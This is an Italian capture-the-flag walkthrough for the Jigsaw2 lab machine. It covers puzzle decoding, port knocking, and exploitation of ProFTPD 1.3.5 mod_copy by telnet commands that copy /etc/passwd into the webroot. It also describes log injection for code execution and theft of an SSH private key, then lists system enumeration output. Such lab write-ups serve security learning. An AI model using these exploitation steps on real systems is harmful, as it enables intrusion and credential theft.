# Jigsaw2-CTF

# Soluzione Walkthrough



Cominciamo con l'identificazione del target :

```
root@jigsaw2:~/Jigsaw2# nmap -sn 192.168.1.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-15 07:36 EDT
Nmap scan report for 192.168.1.1
Host is up (0.014s latency).
MAC Address: 18:0F:76:98:55:8C (Unknown)
Nmap scan report for DESKTOP-7C0JALA (192.168.1.100)
Host is up (0.0014s latency).
MAC Address: 74:DF:BF:A2:5C:64 (Liteon Technology)
Nmap scan report for COM-MID1 (192.168.1.101)
Host is up (0.11s latency).
MAC Address: 28:24:FF:C5:64:AE (Wistron Neweb)
Nmap scan report for jigsaw2 (192.168.1.137)
Host is up (0.00029s latency).
MAC Address: 08:00:27:44:BC:DD (Oracle VirtualBox virtual NIC)
Nmap scan report for DESKTOP-7C0JALA (192.168.1.232)
Host is up.
Nmap done: 256 IP addresses (7 hosts up) scanned in 17.14 seconds
```



Troviamo che il nostro target ha indirizzo 192.168.1.137.
(Questo ip subira' variazioni dovute al renew del servizio dhcp durante i test).
Verifichiamo adesso l'indirizzo ip della macchina attaccante :

```
root@jigsaw2:~# ip addr sh
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:1b:2d:b5 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.232/24 brd 192.168.1.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe1b:2db5/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
root@jigsaw2:~# 

```




Passiamo a una scansione dei servizi esposti :

![Schermata da 2019-09-15 08-20-14](https://user-images.githubusercontent.com/54471416/66257019-2419e980-e762-11e9-975a-0957daa5e592.png)

Troviamo vari servizi esposti.Tra questi vediamo rpc e il servizio mountd.
Vediamo se troviamo qualche informazione in piu' :

![Schermata da 2019-09-15 08-26-30](https://user-images.githubusercontent.com/54471416/66257027-37c55000-e762-11e9-9830-57f710b63433.png)

proviamo a verificare se ci sono directory esportate montabili .
Il comando showmount sembra freezzarsi, ma proviamo comunque a montare una directory nfs.

![Schermata da 2019-09-15 08-37-13](https://user-images.githubusercontent.com/54471416/66257034-49a6f300-e762-11e9-94f9-b8fee8b194cd.png)

Riusciamo a montare una directory ma almeno per il momento non ci aiuta, non abbiamo i permessi per andare oltre.
Passiamo a verificare il servizio http.
All'inizio troviamo questa pagina index.

![Schermata da 2019-09-15 08-41-56](https://user-images.githubusercontent.com/54471416/66257041-575c7880-e762-11e9-8e06-60af960e3b0a.png)

All'interno del sorgente della pagina troviamo un file js che viene chiamato.

![Schermata da 2019-09-15 08-44-39](https://user-images.githubusercontent.com/54471416/66257050-76f3a100-e762-11e9-87ed-32d35013a24b.png)

Analizziamone il contenuto :

![Schermata da 2019-09-15 08-47-43](https://user-images.githubusercontent.com/54471416/66257057-8b379e00-e762-11e9-9c0c-3898c82a02dd.png)

Troviamo qualche cosa di interessante, var _0x10f6=['/w3lc0m3707h364m3'];
Potrebbe essre una URI.Proviamola sul browser :

![Schermata da 2019-09-15 08-49-53](https://user-images.githubusercontent.com/54471416/66257060-938fd900-e762-11e9-8baa-cbed3716ba46.png)

Proviamo a enumerare con dirbuster files o directory all'interno del percorso trovato.

![Schermata da 2019-09-15 09-00-56](https://user-images.githubusercontent.com/54471416/66257070-a4d8e580-e762-11e9-8ba3-8dd1939a94ef.png)

Troviamo un game.txt.
Vediamo cosa contiene.

![Schermata da 2019-09-15 09-02-53](https://user-images.githubusercontent.com/54471416/66257073-a7d3d600-e762-11e9-8420-5b80d78942d0.png)

Dunque, troviamo 2 immagini e una stringa che potremmo provare a decodificare con un caesar cipher.
Corretto.Troviamo “y0uf0und4n07h3r0n3”.
Adesso vediamo le due immagini.Troviamo visivamente che avvicinandole appare la scritta “0663”.

Le scarichiamo e sottoponendole a string troviamo che entrambi hanno una stringa attaccata alla fine del file.

![Schermata da 2019-09-15 10-22-34](https://user-images.githubusercontent.com/54471416/66257091-df428280-e762-11e9-91c6-f5d9dbf58208.png)

Proviamo a concatenare anche queste e a decodificarle in rot13.

![Schermata da 2019-09-15 10-25-03](https://user-images.githubusercontent.com/54471416/66257101-f71a0680-e762-11e9-8bb6-5edcf090c278.png)

E' uscito fuori qualche cosa di interessante.
 
c4n_f1nd_m3_z3pp_
l375_pl4y_4_n3w_64m3 

Dopo aver pensato un po' senza alcuna soluzione.Riflettiamo che la seconda frase sopra ,lascia intendere come 
se avessimo gia' il dato. Ricapitolando,gli unici dati che abbiamo sono i seguenti 3 :

c4nf1ndm3z3pp
l375pl4y4n3w64m3
y0uf0und4n07h3r0n3

possiamo provarli integrandoli nell'url :

![Schermata da 2019-09-15 12-58-37](https://user-images.githubusercontent.com/54471416/66257105-fa14f700-e762-11e9-8ea5-095b1c9a556b.png)

Trovato un percorso valido.
Ci sono delle scritte dentro gli occhi, potremmo applicare lo zoom per leggerle.
Inoltre visionando il sorgente della pagina troviamo qualcosaltro :

![Schermata da 2019-09-15 13-07-12](https://user-images.githubusercontent.com/54471416/66257112-0c8f3080-e763-11e9-88a4-d5a056be1e6f.png)

applicando lo zoom troviamo queste 2 stringhe :

600d_j0b_p13c3_f0und
y4y_4n07h3r_0n3_6r347

Adesso sfruttiamo l'url trovato all'interno del sorgente , apriamolo via browser:

![Schermata da 2019-09-15 13-29-12](https://user-images.githubusercontent.com/54471416/66257123-23358780-e763-11e9-9565-197629d57977.png)

Cerchiamo qualche informazione nascosta all'interno dell'immagine :

![Schermata da 2019-09-15 13-38-56](https://user-images.githubusercontent.com/54471416/66257127-29c3ff00-e763-11e9-83c1-e613f0cb4842.png)

Bene.Sembrerebbe una stringa codificata in base 64.
Verifichiamo :

![Schermata da 2019-09-15 13-42-08](https://user-images.githubusercontent.com/54471416/66257133-334d6700-e763-11e9-806f-85cc0b68f8db.png)

Corretto.
Proviamo ad aprire il riferimento all'immagine sul browser :

![Schermata da 2019-09-15 13-44-48](https://user-images.githubusercontent.com/54471416/66257141-5bd56100-e763-11e9-9e3b-8d18916a0791.png)

Otteniamo un terzo pezzo.Adesso il codice diventa “06632”.
Proviamo a trovare qualche info in piu'. 

Notiamo una seguenza esadecimale prima della stringa in base64,vediamo se ci puo' essere utile.
Potrebbe essere una rappresentazione esadecimale di una stringa ascii.


66 31 6e 34  6c 6c 79 79 30 75 6d 34 64 33 31 37 68 33 72 33 2e 6a 70 67

f    1   n   4    l   l    y   y   0   u   m  4  d   3   1   7   h  3   r    3   .   j    p   g


Proviamo a cercarlo via browser :

![Schermata da 2019-09-17 18-49-33](https://user-images.githubusercontent.com/54471416/66257143-5f68e800-e763-11e9-9b6f-2d6069bc1680.png)

64m31m463zp41n.jpg
64m31m463zy44p41n.jpg

c4nf1ndm3z3pp
l375pl4y4n3w64m3
y0uf0und4n07h3r0n3

y4yy0ud1d17bu7176375w0r57.jpg
600dj0bp13c3f0und.jpg
y4y4n07h3r0n36r347.jpg
/m3rcyup0ny0u
/y0uf0und4n07h3r0n3

f1n4llyy0um4d317h3r3.jpg


Ricapitolando, alla fine di ogni immagine, pezzo, e' attaccata una stringa in codifica rot13.


p4as1aqz3m3cc
y375cy4l4a3j64z3
p0z3s1aqz3
u3ycz3y1s3
w1654jp4au4px700
p0z3cy4lj17uz3


Decodificate :

c4nf1ndm3z3pp
l375pl4y4n3w64m3
c0m3f1ndm3
h3lpm3l1f3
j1654wc4nh4ck700
c0m3pl4yw17hm3


Unendo tutti i pezzi otteniamo questa immagine :

![Schermata da 2019-09-17 19-35-11](https://user-images.githubusercontent.com/54471416/66257149-655ec900-e763-11e9-8817-8aff68543211.png)

666, 066, 3432 ... potrebbero essere delle porte...
Oltre a unire le immagini proviamo a concatenare anche le stringhe trovate all'interno di ogni jpg.
Dopo aver provato alcune sequenze otteniamo :

c4nf1ndm3z3ppl375pl4y4n3w64m3c0m3f1ndm3h3lpm3l1f3c0m3pl4yw17hm3j1654wc4nh4ck700

Proviamo ad aprirlo dal browser come url :

![Schermata da 2019-09-30 20-03-38](https://user-images.githubusercontent.com/54471416/66257170-9f2fcf80-e763-11e9-920c-dfdfac9755c6.png)

proviamo un paio di sequenze per il port knocking e alla fine troviamo la 066 666 3432 :

![Schermata da 2019-10-03 12-33-56](https://user-images.githubusercontent.com/54471416/66257193-c8e8f680-e763-11e9-9fb0-ced96e4f8b37.png)

Verifichiamo se e' cambiato qualcosa tra i servizi esposti :

![Schermata da 2019-10-03 19-12-58](https://user-images.githubusercontent.com/54471416/66257197-d7cfa900-e763-11e9-8182-b32e03c10a5e.png)

Adesso risulta esposta anche la porta 21 diun servizio ftp.
Il servizio che gira e' Proftpd 1.3.5.
Verifichiamo se e' presente qualche vulnerabilita' nota :

![Schermata da 2019-10-04 03-51-23](https://user-images.githubusercontent.com/54471416/66257204-ef0e9680-e763-11e9-80e4-817d4bf8711b.png)

Interessante!Gli ultimi 2 sfruttano una vulnerabilita' del servizio che permette, a utenti non autenticati, la copia di file con livello di accesso legato all'utenza con cui gira il servizio ftpd.
Verifichiamo se sfruttabile.Per poterlo fare abbiamo bisogno di un riferimento ad un percorso scrivibile, ma non solo, per poter esserci utile il percorso dovrebbe essere raggiungibile da un servizio esterno che ci permetterebbe di visualizzare i risultati ottenuti.Nel nostro caso il webserver.
Proviamo a utilizzare il webroot di default  con l'utimo exploit in elenco 36742 :

![Schermata da 2019-10-04 04-27-36](https://user-images.githubusercontent.com/54471416/66257218-254c1600-e764-11e9-982f-37ffac567014.png)

Mmhh...proviamo uno dei path che abbiamo ottenuto in precedenza :

```
root@jigsaw2:~/.ssh# telnet 192.168.1.145 21
Trying 192.168.1.145...
Connected to 192.168.1.145.
Escape character is '^]'.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.1.145]
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /var/www/html/w3lc0m3707h364m3/test.php          
250 Copy successful
```
Bene!
Verifichiamo i risultati dal browser :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jigsaw:x:1000:1000:jigsaw:/home/jigsaw:/bin/bash
statd:x:111:65534::/var/lib/nfs:/usr/sbin/nologin
```

Perfetto!
Gli utenti interessanti in questo caso sono root e jigsaw.
Possiamo adesso acquisire delle altre informazioni sul sistema.
Ad esempio, essendo attivo un servizio ssh e avendo utenze utili possiamo verificare le modalita' di autenticazione :

![Schermata da 2019-10-02 19-31-50](https://user-images.githubusercontent.com/54471416/66257251-7c51eb00-e764-11e9-8b56-326d1570f8d7.png)

A quanto sembra il servizio e' configurato per utilizzare chiavi e password per l'autenticazione,possiamo verificarne quindi configurazioni e possibili chiavi.

![Schermata da 2019-10-02 19-14-42](https://user-images.githubusercontent.com/54471416/66257265-9d1a4080-e764-11e9-9fcd-ac67ee5ae8ba.png)

![Schermata da 2019-10-02 19-27-27](https://user-images.githubusercontent.com/54471416/66257267-ae634d00-e764-11e9-8824-d1a3b17500f8.png)

Bene!
Verifichiamo i risultati :

![Schermata da 2019-10-02 19-25-17](https://user-images.githubusercontent.com/54471416/66257271-bcb16900-e764-11e9-9849-c6cd80fccf7c.png)

![Schermata da 2019-10-02 19-25-12](https://user-images.githubusercontent.com/54471416/66257272-bf13c300-e764-11e9-8e00-3b9da9112637.png)

Abbiamo la chiave pubblica di jigsaw!
Ci serve la chiave privata.Verifichiamo se riusciamo a trovarle entrambe.

![Schermata da 2019-10-04 04-56-40](https://user-images.githubusercontent.com/54471416/66257973-9512ce80-e76d-11e9-93b1-f2b95a1ddcd8.png)


La chiave pubblica riusciamo a riscontrarla mentre la chiave privata,quantomeno non si trova nel path di default.
Dobbiamo trovare un altro metodo.
Dopo qualche prova per verificare le possibilita' di lettura/scrittura nel filesystem, notiamo che tra le altre cose riusciamo a leggere 
qualche file di log.
Ripensando al penultimo exploit in elenco sopra, il 36803, e notando che l'installazione di proftpd e' di default e che logga gli eventi su syslog,
potremmo verificare se possibile generare un log injection e poi sfruttarlo per mezzo del bug mod_copy per ottenere una command execution.

![Schermata da 2019-10-04 05-21-58](https://user-images.githubusercontent.com/54471416/66258043-95f83000-e76e-11e9-8a04-322736dba7ab.png)

Bene!Proviamo a eseguire tramite browser :

![Schermata da 2019-10-04 05-23-48](https://user-images.githubusercontent.com/54471416/66258108-55e57d00-e76f-11e9-86c6-6bfcd6124040.png)

Bingo!Notiamo che e' stato eseguito il comando id alla fine del file!
Andiamo a verificare adesso se riusciamo a trovare la chiave privata di jigsaw per ottenere un accesso ssh.

![Schermata da 2019-10-04 05-29-59](https://user-images.githubusercontent.com/54471416/66258150-a65cda80-e76f-11e9-884b-dd393d2c483e.png)

Vediamo il risultato :

![Schermata da 2019-10-04 05-31-31](https://user-images.githubusercontent.com/54471416/66258171-cc827a80-e76f-11e9-8d57-5fb3d0a8f18b.png)

Sembrerebbe che ci sia!
'/authorized_key sid_rsa.pub jigkey' e che si chiami jigkey!
Prendiamola


![Schermata da 2019-10-04 05-37-29](https://user-images.githubusercontent.com/54471416/66258178-e58b2b80-e76f-11e9-92bc-87169937a788.png)

![Schermata da 2019-10-04 05-38-06](https://user-images.githubusercontent.com/54471416/66258210-5b8f9280-e770-11e9-8b97-2116e2c8eed1.png)

Oh yes!
A questo punto proviamo ad applicare la coppia di chiavi sul nostro sistema attaccante e a eseguire l'accesso :

![Schermata da 2019-10-04 05-48-53](https://user-images.githubusercontent.com/54471416/66257292-2f224900-e765-11e9-90a0-797c4df727bc.png)


Bingo!Siamo dentro,.
A quanto pare jigsaw e' un utente privilegiato e puo' usare sudo...
Cerchiamo adesso qualche informazione per scalare a root

```
jigsaw@jigsaw2:~$ uname -a
Linux jigsaw2 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

```
jigsaw@jigsaw2:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,jigsaw
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:jigsaw
floppy:x:25:
tape:x:26:
sudo:x:27:jigsaw
audio:x:29:
dip:x:30:jigsaw
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:jigsaw
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
input:x:104:
crontab:x:105:
syslog:x:106:
messagebus:x:107:
lxd:x:108:jigsaw
mlocate:x:109:
uuidd:x:110:
ssh:x:111:
landscape:x:112:
jigsaw:x:1000:
ssl-cert:x:113:
```

```
jigsaw@jigsaw2:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.2 LTS
Release:	18.04
Codename:	bionic
```

```
jigsaw@jigsaw2:~$ apt list --installed 
Listing... Done
accountsservice/bionic,now 0.6.45-1ubuntu1 amd64 [installed]
acl/bionic,now 2.2.52-3build1 amd64 [installed]
acpid/bionic,now 1:2.0.28-1ubuntu1 amd64 [installed]
adduser/bionic,now 3.116ubuntu1 all [installed]
amd64-microcode/bionic-updates,now 3.20180524.1~ubuntu0.18.04.2 amd64 [installed,automatic]
apache2/bionic-updates,bionic-security,now 2.4.29-1ubuntu4.11 amd64 [installed]
apache2-bin/bionic-updates,bionic-security,now 2.4.29-1ubuntu4.11 amd64 [installed,automatic]
apache2-data/bionic-updates,bionic-security,now 2.4.29-1ubuntu4.11 all [installed,automatic]
apache2-utils/bionic-updates,bionic-security,now 2.4.29-1ubuntu4.11 amd64 [installed,automatic]
apparmor/bionic-updates,bionic-security,now 2.12-4ubuntu5.1 amd64 [installed]
apport/bionic-updates,bionic-security,now 2.20.9-0ubuntu7.7 all [installed]
apport-symptoms/bionic,now 0.20 all [installed]
apt/now 1.6.8 amd64 [installed,upgradable to: 1.6.12]
apt-utils/now 1.6.8 amd64 [installed,upgradable to: 1.6.12]
at/bionic,now 3.1.20-3.1ubuntu2 amd64 [installed]
base-files/now 10.1ubuntu2.4 amd64 [installed,upgradable to: 10.1ubuntu2.6]
base-passwd/bionic,now 3.5.44 amd64 [installed]
bash/bionic,now 4.4.18-2ubuntu1 amd64 [installed,upgradable to: 4.4.18-2ubuntu1.2]
bash-completion/bionic,now 1:2.8-1ubuntu1 all [installed]
bc/bionic,now 1.07.1-2 amd64 [installed]
bcache-tools/bionic,now 1.0.8-2build1 amd64 [installed]
bind9-host/bionic-security,now 1:9.11.3+dfsg-1ubuntu1.8 amd64 [installed,upgradable to: 1:9.11.3+dfsg-1ubuntu1.9]
binutils/bionic-updates,bionic-security,now 2.30-21ubuntu1~18.04.2 amd64 [installed]
binutils-common/bionic-updates,bionic-security,now 2.30-21ubuntu1~18.04.2 amd64 [installed,automatic]
binutils-x86-64-linux-gnu/bionic-updates,bionic-security,now 2.30-21ubuntu1~18.04.2 amd64 [installed,automatic]
bsdmainutils/bionic,now 11.1.2ubuntu1 amd64 [installed]
bsdutils/now 1:2.31.1-0.4ubuntu3.3 amd64 [installed,upgradable to: 1:2.31.1-0.4ubuntu3.4]
btrfs-progs/bionic,now 4.15.1-1build1 amd64 [installed]
btrfs-tools/bionic,now 4.15.1-1build1 amd64 [installed]
busybox-initramfs/bionic-updates,bionic-security,now 1:1.27.2-2ubuntu3.2 amd64 [installed]
busybox-static/bionic-updates,bionic-security,now 1:1.27.2-2ubuntu3.2 amd64 [installed]
byobu/bionic,now 5.125-0ubuntu1 all [installed]
bzip2/bionic-updates,bionic-security,now 1.0.6-8.1ubuntu0.2 amd64 [installed]
ca-certificates/bionic,bionic-updates,now 20180409 all [installed]
cloud-guest-utils/bionic,now 0.30-0ubuntu5 all [installed]
cloud-init/now 18.4-0ubuntu1~18.04.1 all [installed,upgradable to: 19.2-36-g059d049c-0ubuntu1~18.04.1]
cloud-initramfs-copymods/bionic-updates,now 0.40ubuntu1.1 all [installed]
cloud-initramfs-dyn-netconf/bionic-updates,now 0.40ubuntu1.1 all [installed]
command-not-found/bionic-updates,now 18.04.5 all [installed]
command-not-found-data/bionic-updates,now 18.04.5 amd64 [installed]
console-setup/now 1.178ubuntu2.7 all [installed,upgradable to: 1.178ubuntu2.9]
console-setup-linux/now 1.178ubuntu2.7 all [installed,upgradable to: 1.178ubuntu2.9]
coreutils/bionic,now 8.28-1ubuntu1 amd64 [installed]
cpio/bionic,now 2.12+dfsg-6 amd64 [installed]
cpp/bionic-updates,bionic-security,now 4:7.4.0-1ubuntu2.3 amd64 [installed,automatic]
cpp-7/bionic-updates,bionic-security,now 7.4.0-1ubuntu1~18.04.1 amd64 [installed,automatic]
crda/bionic,now 3.18-1build1 amd64 [installed,automatic]
cron/bionic,now 3.0pl1-128.1ubuntu1 amd64 [installed]
cryptsetup/bionic-updates,now 2:2.0.2-1ubuntu1.1 amd64 [installed]
cryptsetup-bin/bionic-updates,now 2:2.0.2-1ubuntu1.1 amd64 [installed]
curl/bionic-updates,bionic-security,now 7.58.0-2ubuntu3.8 amd64 [installed]
dash/bionic,now 0.5.8-2.10 amd64 [installed]
dbus/bionic-updates,bionic-security,now 1.12.2-1ubuntu1.1 amd64 [installed]
debconf/bionic,now 1.5.66 all [installed,upgradable to: 1.5.66ubuntu1]
debconf-i18n/bionic,now 1.5.66 all [installed,upgradable to: 1.5.66ubuntu1]
debianutils/bionic,now 4.8.4 amd64 [installed]
diffutils/bionic,now 1:3.6-1 amd64 [installed]
dirmngr/bionic-updates,bionic-security,now 2.2.4-1ubuntu1.2 amd64 [installed]
distro-info-data/bionic-updates,bionic-security,now 0.37ubuntu0.5 all [installed]
dmeventd/bionic,now 2:1.02.145-4.1ubuntu3 amd64 [installed,upgradable to: 2:1.02.145-4.1ubuntu3.18.04.1]
dmidecode/bionic,now 3.1-1 amd64 [installed]
dmsetup/bionic,now 2:1.02.145-4.1ubuntu3 amd64 [installed,upgradable to: 2:1.02.145-4.1ubuntu3.18.04.1]
dns-root-data/bionic,now 2018013001 all [installed]
dnsmasq-base/bionic,now 2.79-1 amd64 [installed]
dnsutils/bionic-security,now 1:9.11.3+dfsg-1ubuntu1.8 amd64 [installed,upgradable to: 1:9.11.3+dfsg-1ubuntu1.9]
dosfstools/bionic,now 4.1-1 amd64 [installed]
dpkg/now 1.19.0.5ubuntu2.1 amd64 [installed,upgradable to: 1.19.0.5ubuntu2.3]
e2fsprogs/bionic-updates,bionic-security,now 1.44.1-1ubuntu1.2 amd64 [installed]
eatmydata/bionic,now 105-6 all [installed,automatic]
ebtables/bionic-updates,now 2.0.10.4-3.5ubuntu2.18.04.3 amd64 [installed]
ed/bionic,now 1.10-2.1 amd64 [installed]
eject/bionic,now 2.1.5+deb1+cvs20081104-13.2 amd64 [installed]
ethtool/bionic,now 1:4.15-0ubuntu1 amd64 [installed]
fail2ban/bionic,now 0.10.2-2 all [installed]
fdisk/now 2.31.1-0.4ubuntu3.3 amd64 [installed,upgradable to: 2.31.1-0.4ubuntu3.4]
file/bionic-updates,bionic-security,now 1:5.32-2ubuntu0.2 amd64 [installed]
findutils/bionic,now 4.6.0+git+20170828-2 amd64 [installed]
fonts-ubuntu-console/bionic,now 0.83-2 all [installed]
friendly-recovery/now 0.2.38ubuntu1 all [installed,upgradable to: 0.2.38ubuntu1.1]
ftp/bionic,now 0.17-34 amd64 [installed]
fuse/bionic,now 2.9.7-1ubuntu1 amd64 [installed]
gawk/bionic,now 1:4.1.4+dfsg-1build1 amd64 [installed]
gcc/bionic-updates,bionic-security,now 4:7.4.0-1ubuntu2.3 amd64 [installed]
gcc-7/bionic-updates,bionic-security,now 7.4.0-1ubuntu1~18.04.1 amd64 [installed,automatic]
gcc-7-base/bionic-updates,bionic-security,now 7.4.0-1ubuntu1~18.04.1 amd64 [installed,automatic]
gcc-8-base/bionic-updates,bionic-security,now 8.3.0-6ubuntu1~18.04.1 amd64 [installed]
gdisk/bionic,now 1.0.3-1 amd64 [installed,automatic]
geoip-database/bionic,now 20180315-1 all [installed]
gettext-base/bionic-updates,bionic-security,now 0.19.8.1-6ubuntu0.3 amd64 [installed]
gir1.2-glib-2.0/bionic,now 1.56.1-1 amd64 [installed]
git/bionic-updates,bionic-security,now 1:2.17.1-1ubuntu0.4 amd64 [installed]
git-man/bionic-updates,bionic-security,now 1:2.17.1-1ubuntu0.4 all [installed]
gnupg/bionic-updates,bionic-security,now 2.2.4-1ubuntu1.2 amd64 [installed]
gnupg-l10n/bionic-updates,bionic-security,now 2.2.4-1ubuntu1.2 all [installed]
gnupg-utils/bionic-updates,bionic-security,now 2.2.4-1ubuntu1.2 amd64 [installed]
gpg/bionic-updates,bionic-security,now 2.2.4-1ubuntu1.2 amd64 [installed]
gpg-agent/bionic-updates,bionic-security,now 2.2.4-1ubuntu1.2 amd64 [installed]
gpg-wks-client/bionic-updates,bionic-security,now 2.2.4-1ubuntu1.2 amd64 [installed]
gpg-wks-server/bionic-updates,bionic-security,now 2.2.4-1ubuntu1.2 amd64 [installed]
gpgconf/bionic-updates,bionic-security,now 2.2.4-1ubuntu1.2 amd64 [installed]
gpgsm/bionic-updates,bionic-security,now 2.2.4-1ubuntu1.2 amd64 [installed]
gpgv/bionic-updates,bionic-security,now 2.2.4-1ubuntu1.2 amd64 [installed]
grep/bionic,now 3.1-2 amd64 [installed,upgradable to: 3.1-2build1]
groff-base/bionic,now 1.22.3-10 amd64 [installed]
grub-common/bionic-updates,now 2.02-2ubuntu8.13 amd64 [installed,automatic]
grub-gfxpayload-lists/bionic,now 0.7 amd64 [installed,automatic]
grub-legacy-ec2/bionic,now 1:1 all [installed]
grub-pc/bionic-updates,now 2.02-2ubuntu8.13 amd64 [installed,automatic]
grub-pc-bin/bionic-updates,now 2.02-2ubuntu8.13 amd64 [installed,automatic]
grub2-common/bionic-updates,now 2.02-2ubuntu8.13 amd64 [installed,automatic]
gzip/bionic,now 1.6-5ubuntu1 amd64 [installed]
hdparm/bionic,now 9.54+ds-1 amd64 [installed]
hostname/bionic,now 3.20 amd64 [installed]
htop/bionic,now 2.1.0-3 amd64 [installed]
info/bionic,now 6.5.0.dfsg.1-2 amd64 [installed]
init/bionic,now 1.51 amd64 [installed]
init-system-helpers/bionic,now 1.51 all [installed]
initramfs-tools/bionic-security,now 0.130ubuntu3.6 all [installed,upgradable to: 0.130ubuntu3.8]
initramfs-tools-bin/bionic-security,now 0.130ubuntu3.6 amd64 [installed,upgradable to: 0.130ubuntu3.8]
initramfs-tools-core/bionic-security,now 0.130ubuntu3.6 all [installed,upgradable to: 0.130ubuntu3.8]
install-info/bionic,now 6.5.0.dfsg.1-2 amd64 [installed]
intel-microcode/bionic-updates,bionic-security,now 3.20190618.0ubuntu0.18.04.1 amd64 [installed,automatic]
iproute2/bionic,now 4.15.0-2ubuntu1 amd64 [installed]
iptables/bionic,now 1.6.1-2ubuntu2 amd64 [installed]
iptables-persistent/bionic-updates,now 1.0.4+nmu2ubuntu1 all [installed]
iputils-ping/bionic,now 3:20161105-1ubuntu2 amd64 [installed,upgradable to: 3:20161105-1ubuntu3]
iputils-tracepath/bionic,now 3:20161105-1ubuntu2 amd64 [installed,upgradable to: 3:20161105-1ubuntu3]
irqbalance/bionic-updates,now 1.3.0-0.1ubuntu0.18.04.1 amd64 [installed]
isc-dhcp-client/bionic-updates,bionic-security,now 4.3.5-3ubuntu7.1 amd64 [installed]
isc-dhcp-common/bionic-updates,bionic-security,now 4.3.5-3ubuntu7.1 amd64 [installed]
iso-codes/bionic,now 3.79-1 all [installed]
iucode-tool/bionic,now 2.3.1-1 amd64 [installed,automatic]
iw/bionic,now 4.14-0.1 amd64 [installed,automatic]
kbd/bionic,now 2.0.4-2ubuntu1 amd64 [installed]
keyboard-configuration/now 1.178ubuntu2.7 all [installed,upgradable to: 1.178ubuntu2.9]
keyutils/bionic,now 1.5.9-9.2ubuntu2 amd64 [installed,automatic]
klibc-utils/bionic,now 2.0.4-9ubuntu2 amd64 [installed]
kmod/bionic-updates,now 24-1ubuntu3.2 amd64 [installed]
knockd/bionic-updates,now 0.7-1ubuntu1.18.04.2 amd64 [installed]
krb5-locales/bionic-updates,bionic-security,now 1.16-2ubuntu0.1 all [installed]
landscape-common/now 18.01-0ubuntu3.2 amd64 [installed,upgradable to: 18.01-0ubuntu3.4]
language-selector-common/now 0.188.1 all [installed,upgradable to: 0.188.3]
less/bionic,now 487-0.1 amd64 [installed]
libaccountsservice0/bionic,now 0.6.45-1ubuntu1 amd64 [installed]
libacl1/bionic,now 2.2.52-3build1 amd64 [installed]
libapache2-mod-php7.2/bionic-updates,bionic-security,now 7.2.19-0ubuntu0.18.04.2 amd64 [installed,automatic]
libapparmor1/bionic-updates,bionic-security,now 2.12-4ubuntu5.1 amd64 [installed]
libapr1/bionic,now 1.6.3-2 amd64 [installed,automatic]
libaprutil1/bionic,now 1.6.1-2 amd64 [installed,automatic]
libaprutil1-dbd-sqlite3/bionic,now 1.6.1-2 amd64 [installed,automatic]
libaprutil1-ldap/bionic,now 1.6.1-2 amd64 [installed,automatic]
libapt-inst2.0/now 1.6.8 amd64 [installed,upgradable to: 1.6.12]
libapt-pkg5.0/now 1.6.8 amd64 [installed,upgradable to: 1.6.12]
libargon2-0/bionic,now 0~20161029-1.1 amd64 [installed]
libasan4/bionic-updates,bionic-security,now 7.4.0-1ubuntu1~18.04.1 amd64 [installed,automatic]
